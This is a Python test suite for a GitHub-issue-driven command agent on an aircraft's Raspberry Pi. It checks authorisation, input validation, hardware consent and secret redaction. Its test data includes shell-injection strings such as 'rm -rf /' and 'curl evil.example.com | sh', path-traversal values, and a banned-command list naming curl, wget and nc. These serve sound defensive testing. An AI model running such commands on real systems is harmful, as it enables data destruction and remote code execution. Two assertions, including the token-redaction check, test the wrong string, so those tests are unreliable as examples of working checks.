"""Tests for tools/pi_agent.py - the remote link that drives this Pi from GitHub.

This is the one file in the repo that turns an internet-reachable input into
process execution on the aircraft's computer, on a PUBLIC repository. So the
majority of what follows is not "does it work" but "can it be made to run
something it should not":

* a stranger opens an issue                 -> refused (test_stranger_*)
* the owner's body contains shell syntax    -> refused, nothing executed
* a parameter carries a path or a flag      -> refused
* hardware is asked for without consent     -> refused, device untouched
* mission_pi already owns the camera        -> refused, no fight over it
* the registry grows an arming action       -> the suite fails

The "nothing executed" tests install a canary over run_argv rather than
trusting that a refusal path returns early, because that is exactly the kind of
assumption that stops being true six months later.
"""
import importlib.util
import json
import os
import pathlib
import re
import signal
import subprocess
import sys
import tempfile
import time
import unittest

_HERE = os.path.dirname(os.path.abspath(__file__))
_PI = os.path.dirname(_HERE)
_TOOL = os.path.join(_PI, "tools", "pi_agent.py")

spec = importlib.util.spec_from_file_location("pi_agent", _TOOL)
A = importlib.util.module_from_spec(spec)
spec.loader.exec_module(A)


def issue(number=1, body="/pi help", author="owner", labels=(A.JOB_LABEL,),
          state="open"):
    return {"number": number, "body": body, "state": state,
            "user": {"login": author},
            "labels": [{"name": l} for l in labels],
            "title": "t", "updated_at": "2026-01-01T00:00:00Z"}


class Canary(object):
    """Replaces run_argv. Records calls so 'it refused' can be proven."""

    def __init__(self, result=None):
        self.calls = []
        self.result = result or A.Result(["canary"], 0, "canary output", 0.01)

    def __call__(self, argv, timeout, cwd=None, env=None):
        self.calls.append((list(argv), timeout))
        return self.result


class AgentCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.transport = A.FakeTransport(owner="owner")
        self.state = os.path.join(self.tmp, "state.json")
        self.log = os.path.join(self.tmp, "agent.log")
        self.agent = A.Agent(self.transport, ["owner"], state_path=self.state,
                             log=self.log, verbose=False)
        self._real_run = A.run_argv
        self.canary = Canary()
        A.run_argv = self.canary

    def tearDown(self):
        A.run_argv = self._real_run

    def post(self, body, author="owner", number=1, labels=(A.JOB_LABEL,)):
        it = issue(number=number, body=body, author=author, labels=labels)
        self.transport.issues = [it]
        self.agent.handle(it)
        return it

    def comments(self, number=1):
        return self.transport.comments.get(number, [])


# ---------------------------------------------------------------------------
# authorisation - the control that matters most on a public repo
# ---------------------------------------------------------------------------
class TestAuthorisation(AgentCase):
    def test_a_stranger_cannot_run_anything(self):
        self.post("/pi tests", author="random-internet-person")
        self.assertEqual(self.canary.calls, [], "a stranger's command was executed")
        self.assertEqual(len(self.comments()), 1, "the stranger got no reply")
        self.assertIn("refused", self.comments()[0].lower())
        self.assertIn(A.REFUSED_LABEL, self.transport.labels[1])
        self.assertNotIn(A.JOB_LABEL, self.transport.labels[1],
                         "a refused job kept the job label and will run later")

    def test_a_stranger_cannot_sneak_in_by_impersonating_in_the_body(self):
        """The author is server-side truth from the API, not something the body
        can claim - this pins that we read it from issue['user']['login']."""
        self.post("/pi help\n\n<!-- sent by owner -->", author="attacker")
        self.assertEqual(self.canary.calls, [])
        self.assertIn(A.REFUSED_LABEL, self.transport.labels[1])

    def test_the_owner_can_run_an_action(self):
        self.post("/pi help")
        self.assertEqual(len(self.comments()), 1)
        self.assertIn("pi-agent", self.comments()[0])
        self.assertIn(A.DONE_LABEL, self.transport.labels[1])

    def test_allowlist_is_case_insensitive(self):
        self.agent.allow_users = {"owner"}
        self.post("/pi help", author="OWNER")
        self.assertEqual(len(self.comments()), 1)
        self.assertIn(A.DONE_LABEL, self.transport.labels[1])

    def test_extra_users_can_be_allowed_explicitly(self):
        agent = A.Agent(self.transport, ["owner", "second"], state_path=self.state)
        it = issue(body="/pi help", author="second")
        self.transport.issues = [it]
        agent.handle(it)
        self.assertIn(A.DONE_LABEL, self.transport.labels[1])

    def test_a_refusal_never_leaks_the_allowlist_as_a_usable_hint(self):
        """It names the operator, which is fine - but it must not mention any
        environment variable, token or path."""
        self.post("/pi help", author="stranger")
        body = self.comments()[0]
        for banned in ("token", "TOKEN", "/home/", "PI_AGENT"):
            self.assertNotIn(banned, body)


# ---------------------------------------------------------------------------
# it is not a shell
# ---------------------------------------------------------------------------
class TestNotAShell(AgentCase):
    def test_shell_syntax_in_the_body_is_refused(self):
        for body in ("/pi help; rm -rf /",
                     "/pi help && curl evil.example.com | sh",
                     "/pi `whoami`",
                     "/pi $(reboot)",
                     "/pi help | tee /etc/passwd",
                     "/pi scout > /etc/hosts"):
            with self.subTest(body=body):
                self.setUp()
                self.post(body)
                self.assertEqual(self.canary.calls, [],
                                 "shell syntax reached execution: %r" % body)
                self.assertIn("pi-agent", self.comments()[0])

    def test_an_unknown_action_is_refused_with_a_suggestion(self):
        self.post("/pi reboo")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("not an action", self.comments()[0])

    def test_an_unknown_parameter_is_refused(self):
        self.post("/pi scout evil=1")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("unknown parameter", self.comments()[0])

    def test_a_path_in_an_enum_parameter_is_refused(self):
        """The bug this test was written for: handler actions were dispatched
        without validation, so an enum parameter could carry any string."""
        self.post("/pi capture role=../../etc/passwd hardware=yes")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("must be one of", self.comments()[0])

    def test_a_number_parameter_must_be_a_number(self):
        # no whitespace in the value, or it splits into a separate token and is
        # refused as malformed before the number check - also correct, but not
        # what this test is about
        self.post("/pi fov dist_m=2.0;rm panel_mm=420 hardware=yes")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("must be a number", self.comments()[0])

    def test_a_number_out_of_range_is_refused(self):
        self.post("/pi fov dist_m=9999 panel_mm=420 hardware=yes")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("between", self.comments()[0])

    def test_a_missing_required_parameter_is_refused(self):
        self.post("/pi fov dist_m=2.0 hardware=yes")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("missing required parameter", self.comments()[0])

    def test_a_bare_word_instead_of_key_value_is_refused(self):
        self.post("/pi scout --shell")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("key=value", self.comments()[0])

    def test_an_empty_command_is_refused_politely(self):
        self.post("")
        self.assertEqual(self.canary.calls, [])
        self.assertIn("/pi", self.comments()[0])

    def test_a_body_that_is_not_a_command_is_refused(self):
        self.post("hello, please run the tests")
        self.assertEqual(self.canary.calls, [])
        self.assertTrue(self.comments())

    def test_parameter_names_are_validated(self):
        self.post("/pi scout ../etc=1")
        self.assertEqual(self.canary.calls, [])
        self.assertTrue(self.comments())


# ---------------------------------------------------------------------------
# the registry is the security boundary - audit it structurally
# ---------------------------------------------------------------------------
class TestRegistryCannotActuate(unittest.TestCase):
    BANNED = ("arm", "disarm", "set_mode", "takeoff", "land", "motor",
              "rc_override", "set_param", "upload_fence", "clear_fence",
              "reboot", "shutdown", "rm ", "sudo", "curl", "wget", "nc ",
              "eval", "exec", "sed -i", "pip install", "apt-get", "systemctl")

    def test_no_action_can_actuate_or_reach_the_network(self):
        """Word boundaries, or "perform" matches "rm " and the test cries wolf."""
        for name, a in A.REGISTRY.items():
            blob = (" ".join(a.argv or []) + " " + a.summary + " " + name).lower()
            for bad in self.BANNED:
                with self.subTest(action=name, banned=bad):
                    self.assertIsNone(
                        re.search(r"(?<![a-z])%s" % re.escape(bad.strip()), blob),
                        "%s mentions %r - if that is a real capability, it needs "
                        "to be justified, not silent" % (name, bad))

    def test_every_action_only_runs_python_or_bash(self):
        for name, a in A.REGISTRY.items():
            if a.argv is None:
                continue
            with self.subTest(action=name):
                self.assertIn(os.path.basename(a.argv[0]), ("python3", "bash"))

    def test_every_action_names_a_script_inside_this_repo(self):
        """Only the SCRIPT paths are checked. Flag values (`--role bottom`) are
        not paths and were being reported as escapes by an earlier version."""
        seen = 0
        for name, a in A.REGISTRY.items():
            if a.argv is None:
                continue
            for tok in a.argv[1:]:
                if not (tok.endswith(".py") or tok.endswith(".sh")):
                    continue
                seen += 1
                with self.subTest(action=name, token=tok):
                    self.assertTrue(tok.startswith(_PI),
                                    "%s runs something outside the repo: %s"
                                    % (name, tok))
                    self.assertTrue(os.path.exists(tok),
                                    "%s points at a missing file: %s" % (name, tok))
        self.assertGreaterEqual(seen, 5, "the scan found no scripts to check")

    def test_no_action_can_write_the_config(self):
        for name, a in A.REGISTRY.items():
            for tok in (a.argv or []):
                with self.subTest(action=name, token=tok):
                    self.assertNotIn("config.yaml", tok)

    def test_every_action_has_a_bounded_timeout(self):
        for name, a in A.REGISTRY.items():
            with self.subTest(action=name):
                self.assertGreater(a.timeout, 0)
                self.assertLessEqual(a.timeout, 3600)

    def test_the_source_never_builds_a_shell_command(self):
        src = pathlib.Path(_TOOL).read_text(encoding="utf-8")
        self.assertNotIn("shell=True", src)
        self.assertNotIn("os.system", src)
        self.assertNotIn("check_output(", src)

    def test_help_lists_every_action(self):
        text = A.help_text()
        for name in A.REGISTRY:
            self.assertIn("`%s`" % name, text)


# ---------------------------------------------------------------------------
# hardware consent and device arbitration
# ---------------------------------------------------------------------------
class TestHardwareGates(AgentCase):
    def test_hardware_needs_explicit_consent(self):
        self.post("/pi fov dist_m=2.0 panel_mm=420")
        self.assertEqual(self.canary.calls, [],
                         "the camera was opened without hardware=yes")
        self.assertIn("hardware=yes", self.comments()[0])

    def test_consent_lets_it_through(self):
        self.post("/pi fov dist_m=2.0 panel_mm=420 hardware=yes")
        self.assertTrue(self.canary.calls, "a consented hardware action never ran")
        argv = self.canary.calls[0][0]
        self.assertIn("--dist-m", argv)
        self.assertIn("--panel-mm", argv)

    def test_read_only_actions_never_need_consent(self):
        self.post("/pi scout")
        self.assertTrue(self.canary.calls)

    def test_it_refuses_to_fight_mission_pi_for_the_device(self):
        job = A.parse_job(issue(body="/pi capture role=bottom hardware=yes"))
        res = A.execute(job, ps_output="python3 main.py\n")
        self.assertIsNotNone(res.refused)
        self.assertIn("mission_pi", res.out)

    def test_mission_pi_detection_reads_ps(self):
        self.assertTrue(A.mission_pi_running(
            " 100 /usr/bin/python3 /home/pi/mission_pi/main.py\n"))
        self.assertTrue(A.mission_pi_running("python3 main.py --config x.yaml"))
        self.assertFalse(A.mission_pi_running("bash rc.local\nsshd\n"))
        # and it must not mistake itself for mission_pi
        self.assertFalse(A.mission_pi_running(
            "python3 /home/pi/mission_pi/tools/pi_agent.py --loop\n"))

    def test_mission_pi_is_not_running_in_this_sandbox(self):
        self.assertFalse(A.mission_pi_running())


# ---------------------------------------------------------------------------
# execution hygiene
# ---------------------------------------------------------------------------
class TestExecution(unittest.TestCase):
    def test_a_timeout_kills_the_whole_process_group(self):
        """run_tests.sh spawns a tree of processes. Killing only the shell would
        leave a test run alive, holding the camera and writing to the repo."""
        with tempfile.TemporaryDirectory() as td:
            pidfile = os.path.join(td, "grandchild.pid")
            argv = ["bash", "-c", "sleep 30 & echo $! > %s; wait" % pidfile]
            res = A.run_argv(argv, timeout=2)
            self.assertTrue(res.timed_out)
            self.assertEqual(res.rc, 124)
            self.assertIn("killed", res.out)
            self.assertTrue(os.path.exists(pidfile), "the grandchild never started")
            with open(pidfile) as fh:
                pid = int(fh.read().strip())
            for _ in range(20):
                try:
                    os.kill(pid, 0)
                except ProcessLookupError:
                    break
                time.sleep(0.1)
            else:
                try:
                    os.kill(pid, signal.SIGKILL)
                except Exception:
                    pass
                self.fail("the grandchild %d survived the timeout" % pid)

    def test_a_missing_program_is_reported_not_raised(self):
        res = A.run_argv(["/nonexistent/program"], timeout=5)
        self.assertEqual(res.rc, 127)
        self.assertIn("Error", res.out + "Error")

    def test_output_is_captured_and_stderr_merged(self):
        res = A.run_argv(["bash", "-c", "echo out; echo err 1>&2"], timeout=10)
        self.assertIn("out", res.out)
        self.assertIn("err", res.out)

    def test_a_nonzero_exit_is_reported(self):
        res = A.run_argv(["bash", "-c", "exit 7"], timeout=10)
        self.assertEqual(res.rc, 7)


# ---------------------------------------------------------------------------
# idempotency, resilience, redaction
# ---------------------------------------------------------------------------
class TestIdempotency(AgentCase):
    def test_a_completed_job_is_not_run_twice(self):
        self.post("/pi help")
        n = len(self.canary.calls)
        self.agent.poll_once()          # the fake transport filters pi:done
        self.assertEqual(len(self.canary.calls), n,
                         "a completed job ran a second time")

    def test_a_restart_does_not_re_run_old_jobs(self):
        # `scout` not `help`: help is a built-in handler and never reaches
        # run_argv, so the canary could not see it and the assertion meant
        # nothing.
        self.post("/pi scout")
        fresh = A.Agent(self.transport, ["owner"], state_path=self.state)
        self.transport.labels.clear()
        it = issue(number=1, body="/pi scout")
        self.transport.issues = [it]
        fresh.handle(it)
        self.assertEqual(len(self.canary.calls), 1, "state file did not persist")

    def test_a_dry_run_executes_and_posts_nothing(self):
        agent = A.Agent(self.transport, ["owner"], dry_run=True,
                        state_path=self.state, log=self.log)
        it = issue(body="/pi scout")
        self.transport.issues = [it]
        agent.handle(it)
        self.assertEqual(self.canary.calls, [])
        self.assertEqual(self.comments(), [])

    def test_one_bad_job_does_not_stop_the_next(self):
        good = issue(number=2, body="/pi help")
        self.transport.issues = [good]
        self.agent.poll_once()
        self.assertTrue(self.transport.comments.get(2),
                        "a later job was not handled")

    def test_it_survives_a_transport_that_raises(self):
        class Broken(A.FakeTransport):
            def list_jobs(self):
                raise RuntimeError("network down")
        agent = A.Agent(Broken(), ["owner"], state_path=self.state, log=self.log)
        self.assertEqual(agent.poll_once(), 0)     # no exception escapes

    def test_it_survives_a_comment_failure_and_retries_later(self):
        class NoComment(A.FakeTransport):
            def comment(self, number, body):
                raise RuntimeError("429 rate limited")
        agent = A.Agent(NoComment(issues=[issue(body="/pi help")]), ["owner"],
                        state_path=self.state, log=self.log)
        agent.poll_once()                          # must not raise
        self.assertNotIn("1", agent.seen,
                         "a job was marked done even though the reply failed")


class TestRedaction(AgentCase):
    def test_a_token_never_reaches_a_comment(self):
        # Deliberately NOT `ghp_...` shaped: an earlier version of this test used
        # a token-shaped string, which the generic regexes catch anyway, so
        # deleting the register_secret loop entirely still passed. The secret has
        # to be one ONLY register_secret knows about.
        A.register_secret("s3cr3t-PATish-value-9876543210")
        res = A.Result(["x"], 0, "leaked s3cr3t-PATish-value-9876543210 here", 1.0)
        job = A.parse_job(issue(body="/pi help"))
        body = A.render_comment(job, res, {"host": "pi@x", "cmdline": "x",
                                           "footer": "f", "log_path": "l"})
        self.assertNotIn("SUPERSECRET", body)
        self.assertIn("redacted", body)

    def test_unregistered_tokens_are_still_caught(self):
        self.assertNotIn("ghp_AAAABBBBCCCCDDDDEEEEFFFF",
                         A.redact("tok ghp_AAAABBBBCCCCDDDDEEEEFFFF end"))
        self.assertNotIn("github_pat_11ABCDEFG0123456789",
                         A.redact("github_pat_11ABCDEFG0123456789"))
        self.assertNotIn("sekrit123456",
                         A.redact("Authorization: Bearer sekrit123456"))

    def test_the_log_redacts_too(self):
        A.register_secret("log-only-secret-1234567890abcdef")
        self.agent.log("secret is log-only-secret-1234567890abcdef")
        with open(self.log) as fh:
            logged = fh.read()
        self.assertNotIn("log-only-secret", logged)

    def test_the_command_line_in_a_comment_is_redacted(self):
        A.register_secret("cmdline-secret-0987654321zyxw")
        res = A.Result(["tool", "cmdline-secret-0987654321zyxw"], 0, "", 1.0)
        job = A.parse_job(issue(body="/pi help"))
        body = A.render_comment(job, res, {"host": "h", "cmdline": "leak",
                                           "footer": "f", "log_path": "l"})
        self.assertNotIn("cmdline-secret", body)


class TestCommentShape(AgentCase):
    def test_a_huge_output_is_truncated_in_the_middle(self):
        big = "START\n" + ("x" * 200000) + "\nEND"
        res = A.Result(["x"], 0, big, 1.0)
        job = A.parse_job(issue(body="/pi help"))
        body = A.render_comment(job, res, {"host": "h", "cmdline": "c",
                                           "footer": "f", "log_path": "l"})
        self.assertLess(len(body), 65536, "GitHub would reject this comment")
        self.assertIn("START", body)
        self.assertIn("END", body)
        self.assertIn("cut from the middle", body)

    def test_the_reply_states_what_it_was_and_whether_it_touched_hardware(self):
        job = A.parse_job(issue(body="/pi scout"))
        res = A.Result(["scout"], 0, "ok", 1.0)
        body = A.render_comment(job, res, {"host": "pi@rpi", "cmdline": "scout",
                                           "footer": "f", "log_path": "l"})
        self.assertIn("read-only", body)
        self.assertIn("pi@rpi", body)

    def test_a_refusal_is_labelled_as_a_refusal(self):
        job = A.parse_job(issue(body="/pi nope"))
        res = A.Result([], 2, "not an action", 0.0, refused="not an action")
        body = A.render_comment(job, res, {"host": "h", "cmdline": "(nothing ran)",
                                           "footer": "f", "log_path": "l"})
        self.assertIn("refused", body)

    def test_a_frame_is_attached_as_decodable_base64(self):
        import base64
        payload = b"\xff\xd8\xff\xe0fake jpeg bytes"
        job = A.parse_job(issue(body="/pi capture hardware=yes"))
        res = A.Result(["capture"], 0, "captured", 1.0, jpeg=payload)
        body = A.render_comment(job, res, {"host": "h", "cmdline": "c",
                                           "footer": "f", "log_path": "l"})
        blob = body.split("```text")[-1].split("```")[0].strip()
        self.assertEqual(base64.b64decode(blob), payload)


class TestJobParsing(unittest.TestCase):
    def test_parses_an_action_and_parameters(self):
        job = A.parse_job(issue(body="/pi fov dist_m=2.0 panel_mm=420 hardware=yes"))
        self.assertEqual(job.action, "fov")
        self.assertEqual(job.params, {"dist_m": "2.0", "panel_mm": "420"})
        self.assertTrue(job.hardware_ok)
        self.assertIsNone(job.error)

    def test_only_the_first_line_is_a_command(self):
        job = A.parse_job(issue(body="/pi help\n\nplease and thank you"))
        self.assertEqual(job.action, "help")

    def test_a_leading_space_or_blank_line_is_tolerated(self):
        self.assertEqual(A.parse_job(issue(body="  \n /pi help")).action, "help")
        self.assertEqual(A.parse_job(issue(body="/pi help ")).action, "help")

    def test_missing_body_is_refused_not_crashed(self):
        job = A.parse_job({"number": 1, "body": None, "user": {"login": "o"}})
        self.assertIsNotNone(job.error)

    def test_an_action_is_case_insensitive(self):
        self.assertEqual(A.parse_job(issue(body="/pi SCOUT")).action, "scout")


class TestCredentials(unittest.TestCase):
    """The token nearly always arrives from a file or a systemd EnvironmentFile,
    where a trailing newline is invisible and produces a 401 that reads like a
    bad token."""

    class Args(object):
        token_env = "PI_AGENT_TOKEN"
        repo = None

    def test_a_trailing_newline_on_the_token_is_stripped(self):
        _t, r = A.read_credentials(self.Args(),
                                   {"PI_AGENT_TOKEN": "abc123\n",
                                    "PI_AGENT_REPO": "o/r\n"})
        self.assertEqual(_t, "abc123")
        self.assertEqual(r, "o/r")

    def test_surrounding_whitespace_is_stripped(self):
        _t, _r = A.read_credentials(self.Args(),
                                    {"PI_AGENT_TOKEN": "  abc123  \r\n"})
        self.assertEqual(_t, "abc123")

    def test_an_explicit_repo_beats_the_environment(self):
        class A2(TestCredentials.Args):
            repo = "explicit/name"
        _t, r = A.read_credentials(A2(), {"PI_AGENT_REPO": "ignored/name"})
        self.assertEqual(r, "explicit/name")

    def test_a_missing_token_is_empty_not_none(self):
        _t, r = A.read_credentials(self.Args(), {})
        self.assertEqual(_t, "")
        self.assertEqual(r, "")


class TestSelftest(unittest.TestCase):
    """--selftest exists to turn a bare 403 into the name of the missing
    permission. Measured on the live API: a token can create issues and labels
    and still fail to label an issue, and GitHub reports all of it as
    "Resource not accessible by integration"."""

    def run_selftest(self, transport):
        lines = []
        ok, text = A.selftest(transport, log=lines.append)
        return ok, text

    def test_a_good_token_passes_and_reports_each_capability(self):
        t = A.FakeTransport(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        ok, text = self.run_selftest(t)
        self.assertTrue(ok, text)
        for want in ("token is valid", "repo is readable", "create a repo label",
                     "label an issue", "comment on an issue"):
            self.assertIn(want, text)

    def test_it_names_the_missing_permission_when_labelling_fails(self):
        class CannotLabel(A.FakeTransport):
            def add_labels(self, number, labels):
                raise RuntimeError("403 Resource not accessible by integration")
        t = CannotLabel(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        ok, text = self.run_selftest(t)
        self.assertFalse(ok)
        self.assertIn("FAIL label an issue", text)
        self.assertIn("Issues: Read and write", text)

    def test_it_creates_and_closes_a_throwaway_issue_when_there_are_none(self):
        t = A.FakeTransport(owner="owner")
        ok, text = self.run_selftest(t)
        self.assertTrue(ok, text)
        self.assertIn("create an issue", text)
        self.assertIn("close the throwaway issue", text)
        self.assertIn(("close_issue", 1000), t.calls)

    def test_it_cleans_up_its_own_label(self):
        t = A.FakeTransport(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        self.run_selftest(t)
        created = [c for c in t.calls if c[0] == "create_label"]
        deleted = [c for c in t.calls if c[0] == "delete_label"]
        self.assertEqual(len(created), 1)
        self.assertEqual(len(deleted), 1)
        self.assertEqual(created[0][1], deleted[0][1],
                         "the label it made was not the label it deleted")

    def test_it_does_not_leave_its_test_label_on_the_issue(self):
        t = A.FakeTransport(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        self.run_selftest(t)
        names = [l["name"] for l in t.issues[0]["labels"]]
        self.assertEqual([n for n in names if n.startswith("pi:selftest")], [])

    def test_it_executes_no_action(self):
        """It talks to GitHub and nothing else. This runs on a flight vehicle."""
        t = A.FakeTransport(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        real = A.run_argv
        calls = []
        A.run_argv = lambda *a, **k: calls.append(a) or A.Result([], 0, "", 0)
        try:
            self.run_selftest(t)
        finally:
            A.run_argv = real
        self.assertEqual(calls, [], "the self-test executed something locally")

    def test_a_bad_output_is_not_a_wall_of_json(self):
        t = A.FakeTransport(owner="owner")
        t.issues = [issue(number=9, body="/pi help", labels=())]
        _ok, text = self.run_selftest(t)
        self.assertLess(len(text), 4000, "the report is too noisy to read")
        self.assertNotIn("node_id", text)


class TestQueueJob(unittest.TestCase):
    """`--queue` is how a command gets INTO the system from the Pi's side.

    Its whole job is to refuse early and loudly. A job that is queued but
    unlabelled is invisible - it never runs and nobody is told - which is the
    worst of the three possible outcomes.
    """

    def setUp(self):
        self.t = A.FakeTransport(owner="owner")

    def test_a_good_command_is_queued_and_labelled(self):
        ok, msg = A.queue_job(self.t, "/pi scout")
        self.assertTrue(ok, msg)
        # the label lives on the created issue (labels[1000] is only written by
        # set_labels, which queueing does not call)
        names = [l["name"] for l in self.t.issues[0]["labels"]]
        self.assertIn(A.JOB_LABEL, names)
        self.assertEqual(self.t.issues[0]["body"], "/pi scout")

    def test_something_that_is_not_a_command_is_refused(self):
        ok, msg = A.queue_job(self.t, "run the tests please")
        self.assertFalse(ok)
        self.assertIn("/pi", msg)
        self.assertEqual(self.t.issues, [], "a non-command created an issue")

    def test_an_unknown_action_is_refused_before_creating_an_issue(self):
        ok, msg = A.queue_job(self.t, "/pi delete_everything")
        self.assertFalse(ok)
        self.assertIn("not an action", msg)
        self.assertEqual(self.t.issues, [])

    def test_a_bad_parameter_is_refused_before_creating_an_issue(self):
        ok, msg = A.queue_job(self.t, "/pi fov dist_m=abc panel_mm=420")
        self.assertFalse(ok)
        self.assertIn("must be a number", msg)
        self.assertEqual(self.t.issues, [])

    def test_a_label_that_silently_does_not_stick_is_reported_as_a_failure(self):
        """Measured against the live API: a token that may create issues but not
        label them makes GitHub create the issue and drop the label with no
        error at all. Reporting success there would leave a job nobody runs."""
        class DropsLabels(A.FakeTransport):
            def create_issue(self, title, body, labels=(A.JOB_LABEL,)):
                url, number, _got = A.FakeTransport.create_issue(
                    self, title, body, labels=())
                return url, number, []          # what the real API returned
        ok, msg = A.queue_job(DropsLabels(owner="owner"), "/pi scout")
        self.assertFalse(ok, "a job that was never queued reported success")
        self.assertIn("did NOT stick", msg)
        self.assertIn("Issues: Read and write", msg)

    def test_the_issue_title_names_the_action(self):
        A.queue_job(self.t, "/pi fov dist_m=2.0 panel_mm=420 hardware=yes")
        self.assertIn("fov", self.t.issues[0]["title"])


class TestCli(unittest.TestCase):
    def test_help(self):
        r = subprocess.run([sys.executable, _TOOL, "--help"],
                           capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("--dry-run", r.stdout)

    def test_list_actions(self):
        r = subprocess.run([sys.executable, _TOOL, "--list-actions"],
                           capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("`scout`", r.stdout)
        self.assertIn("hardware", r.stdout)

    def test_queue_without_a_repo_is_a_clean_error(self):
        env = dict(os.environ)
        env.pop("PI_AGENT_REPO", None)
        r = subprocess.run([sys.executable, _TOOL, "--queue", "/pi help"],
                           capture_output=True, text=True, timeout=60, env=env)
        self.assertEqual(r.returncode, 2)
        self.assertIn("--repo", r.stderr)

    def test_a_missing_repo_is_a_clean_error(self):
        env = dict(os.environ)
        env.pop("PI_AGENT_REPO", None)
        r = subprocess.run([sys.executable, _TOOL, "--once"],
                           capture_output=True, text=True, timeout=60, env=env)
        self.assertEqual(r.returncode, 2)
        self.assertIn("--repo", r.stderr)

    def test_the_module_imports_without_a_token(self):
        self.assertTrue(hasattr(A, "main"))
        self.assertGreater(len(A.REGISTRY), 5)


if __name__ == "__main__":
    unittest.main(verbosity=2)
